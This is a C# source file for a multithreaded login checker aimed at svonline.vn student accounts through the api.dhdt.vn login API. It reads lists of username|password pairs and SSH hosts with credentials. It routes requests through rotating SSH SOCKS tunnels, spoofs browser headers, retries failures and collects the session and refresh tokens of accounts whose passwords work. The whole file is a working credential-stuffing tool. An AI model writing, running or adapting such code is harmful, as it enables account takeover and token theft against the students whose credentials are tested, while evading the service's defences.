using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CheckDataOnline.controller
{
    public class ControllerRequest
    {
        Queue<String> proxys;
        Queue<String> datas;
        Chilkat.Http httpGetToken;
        private int quatityThread = 0;
        private Thread thr;

        public Queue<string> Proxys { get => proxys; set => proxys = value; }
        public Queue<string> Datas { get => datas; set => datas = value; }
        public int QuatityThread { get => quatityThread; set => quatityThread = value; }

        public void SetupData(String[] data, String[] proxy)
        {
            proxys = new Queue<String>(proxy);
            datas = new Queue<String>(data);
            RunFakeProxyToHttp();
        }
        public ControllerRequest()
        {
            httpGetToken = new Chilkat.Http();
        }
        public void Stop()
        {
            try
            {
                thr.Abort();
            }
            catch (Exception ex)
            {
                errorEvent("[LOG]" + ex.Message, EventArgs.Empty);
            }
        }
        private event EventHandler errorEvent;
        private event EventHandler processEvent;
        private event EventHandler successEvent;
        public event EventHandler ErrorEvent
        {
            add { this.errorEvent += value; }
            remove { this.processEvent -= value; }
        }
        public event EventHandler ProcessEvent
        {
            add { this.processEvent += value; }
            remove { this.processEvent -= value; }
        }
        public event EventHandler SuccessEvent
        {
            add { this.successEvent += value; }
            remove { this.successEvent -= value; }
        }
        public void Run()
        {
            thr = new Thread(() =>
            {
                bool fake = false;
                int quatity = 0;
                while (true)
                {
                    if (Proxys.Count <= 0 || Datas.Count <= 0)
                    {
                        break;
                    }
                    while (quatity > quatityThread)
                    {
                        Thread.Sleep(1000);
                    }
                    Thread thrItem = new Thread(() =>
                    {
                        if (Proxys.Count <= 0 || Datas.Count <= 0)
                        {
                            return;
                        }
                        quatity++;
                        String data = Datas.Dequeue();
                        while (data.Split('|').Length < 2)
                        {
                            if (Proxys.Count <= 0 || Datas.Count <= 0)
                            {
                                return;
                            }
                            data = Datas.Dequeue();
                            processEvent("[DATA DEQUEUE]", EventArgs.Empty);
                        }
                        if (fake)
                        {
                            RunFakeProxyToHttp();
                        }
                        processEvent("[RUN]" + data, EventArgs.Empty);
                        String _id = GetID(data.Split('|')[0]);
                        if (String.IsNullOrEmpty(_id))
                        {
                            fake = true;
                            Datas.Enqueue(data);
                            quatity--;
                            return;
                        }
                        if (_id == "Empty")
                        {
                            quatity--;
                            return;
                        }
                        String token = GetToken(_id, data.Split('|')[1]);
                        if (String.IsNullOrEmpty(token))
                        {
                            fake = true;
                            Datas.Enqueue(data);
                            quatity--;
                            return;
                        }
                        successEvent(token, EventArgs.Empty);
                        quatity--;
                    });
                    thrItem.IsBackground = true;
                    thrItem.Start();
                }
            });
            thr.IsBackground = true;
            thr.Start();
        }
        public bool FakeProxy(String host, String username, String pass)
        {
            bool success = false;
            Chilkat.SshTunnel tunnel = new Chilkat.SshTunnel();
            Random randomPort = new Random();
            int PortAccepting = randomPort.Next(1000, 65535);
            success = tunnel.Connect(host, 22);
            if (success != true)
            {
                return false;
            }
            success = tunnel.AuthenticatePw(username, pass);
            if (success != true)
            {
                return false;
            }
            tunnel.DynamicPortForwarding = true;
            success = tunnel.BeginAccepting(PortAccepting);
            if (success != true)
            {
                return false;
            }
            httpGetToken.SocksHostname = "127.0.0.1";
            httpGetToken.SocksPort = PortAccepting;
            httpGetToken.SocksVersion = 5;
            return true;

        }
        public void RunFakeProxyToHttp()
        {
            if (Proxys.Count <= 0)
                return;
            String strProxy = Proxys.Dequeue();
            while (strProxy.Split('|').Length < 3)
            {
                if (Proxys.Count <= 0)
                    return;
                strProxy = Proxys.Dequeue();
                processEvent("[PROXY DEQUEUE]", EventArgs.Empty);
            }
            String[] proxySplit = strProxy.Split('|');
            processEvent("[LOG]Đang connect tới proxy", EventArgs.Empty);

            while (!FakeProxy(proxySplit[0], proxySplit[1], proxySplit[2]))
            {
                errorEvent("[LOG]Lỗi connect tới Proxy", EventArgs.Empty);
                while (strProxy.Split('|').Length == 3)
                {
                    strProxy = Proxys.Dequeue();
                }
                proxySplit = strProxy.Split('|');
                processEvent("[PROXY DEQUEUE]", EventArgs.Empty);
                processEvent("[LOG]Đang connect tới proxy", EventArgs.Empty);
            }
        }
        public String GetID(String MSV)
        {
            String url = "https://api.dhdt.vn/account/login/check-smartname";
            String para = "{\"smartname\":\"" + MSV + "\",\"acc_type\":\"all\"}";
            httpGetToken.SetRequestHeader("User-Agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0");
            httpGetToken.SetRequestHeader("Accept", " application/json, text/plain, */*");
            httpGetToken.SetRequestHeader("hostname", " svonline.vn");
            httpGetToken.SetRequestHeader("sso_token", " undefined");
            httpGetToken.SetRequestHeader("refresh_token", " undefined");
            httpGetToken.SetRequestHeader("agent", " {\"brower\":\"svo-web\",\"version\":\"3.6.0\"}");
            httpGetToken.SetRequestHeader("Referer", " https://svonline.vn/");
            Chilkat.HttpResponse responseCheckSmartName = httpGetToken.PostJson2(url, "application/json; charset=utf-8", para);
            if (responseCheckSmartName == null)
            {
                errorEvent("[LOG]Lỗi request get Check Smart Name", EventArgs.Empty);
                return null;
            }
            try
            {
                JObject jsonCheckSmartName = JObject.Parse(responseCheckSmartName.BodyStr);
                try
                {
                    if (jsonCheckSmartName["list_acc"] != null)
                    {
                        if (jsonCheckSmartName["list_acc"].ToArray().Length <= 0)
                        {
                            errorEvent("[LOG]Không tìm thấy tên tài khoản", EventArgs.Empty);
                            return "Empty";
                        }
                        else
                        {
                            String _id = jsonCheckSmartName["list_acc"][0]["_id"].ToString();
                            return _id;
                        }
                    }
                    else
                    {
                        errorEvent("[LOG]Lỗi request get Check Smart Name", EventArgs.Empty);
                        return null;
                    }

                }
                catch (Exception ex)
                {
                    errorEvent("[LOG]Lỗi request get Check Smart Name", EventArgs.Empty);
                    return null;
                }
            }
            catch (Exception ex)
            {
                errorEvent("[LOG]Lỗi request get Check Smart Name", EventArgs.Empty);
                return null;
            }

        }
        public String GetToken(String _id, String pass)
        {
            String url = "https://api.dhdt.vn/account/login/passwd";
            String para = "{\"type\":\"user\",\"_id\":\"" + _id + "\",\"passwd\":\"" + pass + "\"}";
            Chilkat.Http httpGetToken = new Chilkat.Http();
            httpGetToken.SetRequestHeader("User-Agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0");
            httpGetToken.SetRequestHeader("Accept", " application/json, text/plain, */*");
            httpGetToken.SetRequestHeader("hostname", " svonline.vn");
            httpGetToken.SetRequestHeader("sso_token", " undefined");
            httpGetToken.SetRequestHeader("refresh_token", " undefined");
            httpGetToken.SetRequestHeader("agent", " {\"brower\":\"svo-web\",\"version\":\"3.6.0\"}");
            httpGetToken.SetRequestHeader("Referer", " https://svonline.vn/");
            Chilkat.HttpResponse responseGetToken = httpGetToken.PostJson2(url, "application/json; charset=utf-8", para);
            if (responseGetToken == null)
            {
                errorEvent("[LOG]Lỗi request get Token", EventArgs.Empty);
                return null;
            }
            try
            {
                JObject jsonGetToken = JObject.Parse(responseGetToken.BodyStr);
                if (jsonGetToken["stt"].ToString() != "success")
                {
                    errorEvent("[LOG]Lỗi request get Token: " + jsonGetToken["msg"].ToString(), EventArgs.Empty);
                    return null;
                }
                String sso_token = jsonGetToken["sso_token"].ToString();
                String refresh_token = jsonGetToken["refresh_token"].ToString();
                return sso_token + "|" + refresh_token;
            }
            catch (Exception ex)
            {
                errorEvent("[LOG]Lỗi request get Token", EventArgs.Empty);
                return null;
            }
        }
    }
}
